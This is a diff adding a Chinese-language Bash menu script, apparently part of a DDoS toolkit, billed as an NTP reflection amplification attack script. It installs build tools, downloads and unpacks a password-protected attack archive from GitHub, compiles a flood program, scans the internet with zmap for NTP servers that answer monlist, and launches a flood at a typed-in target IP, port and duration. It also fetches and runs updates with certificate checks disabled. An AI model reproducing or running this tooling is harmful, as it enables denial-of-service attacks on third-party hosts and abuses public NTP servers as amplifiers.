@@ -1,0 +1,133 @@
+#! /bin/bash
+
+# 颜色
+sh_ver="1.0"
+Green_font_prefix="\033[32m" && Red_font_prefix="\033[31m" && Green_background_prefix="\033[42;37m" && Red_background_prefix="\033[41;37m" && Font_color_suffix="\033[0m"
+
+# 检查root
+[[ $(id -u) != 0 ]] && red "请以root权限运行此脚本" && exit 1
+
+# 更新脚本
+function step0(){
+wget -O "/root/NTP-Script" "https://raw.githubusercontent.com/76z/Layer/main/Layer4/UDPFLOOD/NTPATTACK/NTP-Script" --no-check-certificate -T 30 -t 5 -d
+chmod +x "/root/NTP-Script"
+chmod 777 "/root/NTP-Script"
+echo -e "脚本已更新为最新版本[ ${sh_new_ver} ]!" && exit 0
+/root/NTP-Script
+}
+# 配置运行环境
+function step1(){
+sudo yum update -y && sudo yum install epel-release -y && sudo yum -y install p7zip p7zip-plugins && sudo yum install gcc libcap libpcap libpcap-devel screen php dstat cmake gmp gmp-devel gengetopt byacc flex git json-c zmap screen -y
+clear
+./NTP-Script
+}
+
+# 获取ntp攻击所需文件.给予ntpchecker和ntpfill操作权限并编译ntp攻击程序
+function step2(){
+wget https://raw.githubusercontent.com/76z/Layer/main/Layer4/UDPFLOOD/NTPATTACK/ntp.7z
+chmod +x ntp.7z && 7z x ntp.7z -pudpflood && rm -f ntp.7z
+sudo chmod +x ntp.c && sudo chmod +x ntpchecker && sudo chmod +x ntpfill && sudo gcc -lpthread ntp.c -lpcap -o ntp && sudo chmod +x ntp
+clear
+./NTP-Script
+}
+
+# zmap扫描得到monlist_fingerprint.txt文件.将扫描得到的monlist_fingerprint.txt文件进行检查得到step1.txt文件.将检查得到的step1.txt文件进行格式化得到ntpamp.txt文件
+function step3(){
+sudo screen zmap -p 123 -M udp --probe-args=file:/root/ntp_123_monlist.pkt -o monlist_fingerprint.txt && sudo ./ntpchecker monlist_fingerprint.txt step1.txt 1 0 1 && sudo awk '$2>419{print $1}' step1.txt | sort -n | uniq | sort -R > ntpamp.txt
+clear
+./NTP-Script
+}
+
+# 将得到的ntpamp.txt文件进行注入
+function step4(){
+sudo ./ntpfill ntpamp.txt 4000
+clear
+./NTP-Script
+}
+
+# 开始攻击
+function step5(){
+read -r -p "请输入要攻击的IP:" IP
+read -r -p "请输入要攻击的端口(默认80):" PORT
+read -r -p "请输入所用的ntp列表(默认ntpamp.txt):" LIST
+read -r -p "请输入要攻击的线程:" THREAD
+read -r -p "请输入要攻击的pps限制(默认无限制):" PPS
+read -r -p "请输入要攻击的时间:" TIME
+./ntp ${IP} ${PORT:-80} ${LIST:-ntpamp.txt} ${THREAD} ${PPS:--1} ${TIME}
+}
+
+# 退回至Layer4菜单
+function step6(){
+clear && ./Layer4
+}
+
+# 退出脚本
+function step7(){
+clear
+exit
+}
+
+# 卸载脚本
+function step8(){
+rm -f NTP-Script
+clear
+exit
+}
+
+
+# 菜单
+function start_menu(){
+clear
+echo && echo && echo -e "      NTP反射放大攻击脚本 ${Red_font_prefix}[v${sh_ver}]${Font_color_suffix} by \033[1;35m76z\033[0m
+  
+  ${Green_font_prefix}0.${Font_color_suffix} NTP-更新脚本
+  ————————————
+  ${Green_font_prefix}1.${Font_color_suffix} NTP-配置环境   
+  ${Green_font_prefix}2.${Font_color_suffix} NTP-更新文件
+  ————————————
+  ${Green_font_prefix}3.${Font_color_suffix} NTP-获取列表    
+  ${Green_font_prefix}4.${Font_color_suffix} NTP-列表注入
+  ————————————
+  ${Green_font_prefix}5.${Font_color_suffix} NTP-开始攻击   
+  ${Green_font_prefix}6.${Font_color_suffix} NTP-退回菜单
+  ————————————
+  ${Green_font_prefix}7.${Font_color_suffix} NTP-退出脚本
+  ${Green_font_prefix}8.${Font_color_suffix} NTP-卸载脚本
+  ————————————" && echo
+    read -e -p " 请输入数字 [0-8]:" menuNumberInput
+    case "$menuNumberInput" in
+        0 )
+           step0
+    ;;
+        1 )
+           step1
+	;;
+        2 )
+           step2
+	;;
+        3 )
+           step3
+    ;;
+        4 )
+           step4
+    ;;  
+        5 )
+           step5
+    ;;
+        6 )
+           step6
+    ;;
+        7 )
+           step7
+    ;;
+        8 )
+           step8
+    ;;
+        * )
+            clear
+            red "请输入正确的数字"
+            start_menu
+        ;;
+    esac
+}
+start_menu "first"
